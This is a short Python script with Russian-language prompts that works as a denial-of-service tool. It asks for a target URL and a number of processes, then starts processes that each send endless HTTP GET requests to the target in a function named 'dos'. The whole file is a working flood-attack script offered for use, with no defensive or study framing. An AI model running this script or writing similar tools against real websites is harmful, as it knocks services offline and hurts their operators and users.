from tqdm import tqdm
import multiprocessing
import time
import requests
import colorama
import os

"""
    @author Grade-Collab
    @author TheEnderOfficial
"""


def check_connection():
    access = os.system("ping -n 2 8.8.8.8")
    if access == 0:
        print(colorama.Fore.GREEN + "Подключение стабильное")
    else:
        print(colorama.Fore.RED + "Не имеется подключение к сети! Остановка")
        quit()


def dos(target):
    while True:
        res = requests.get(target)


def main():
    check_connection()

    try:
        threads_ = input("Укажите количество потоков (по умолчанию 16):")
        threads = int(threads_)
    except Exception:
        threads = 16

    url = input("URL:")
    try:
        timeout_ = input("Задержка перед отправкой в миллисекундах (по умолчанию 300):")
        timeout = int(timeout_) / 1000
    except Exception:
        timeout = 300 / 1000

    if not url.__contains__("http"):
        url = "https://" + url

    print(colorama.Fore.GREEN + "Запущено: " + url)

    pbar = tqdm(total=threads)
    thrs = []
    for i in range(0, threads):
        thr = multiprocessing.Process(target=dos, args=(url,))
        thr.start()
        thrs.append(thr)
        time.sleep(timeout)
        pbar.update(1)
    pbar.close()

    for i in thrs:
        i.terminate()

    print("Выполнено, спасибо за пользование программой.")


if __name__ == '__main__':
    main()
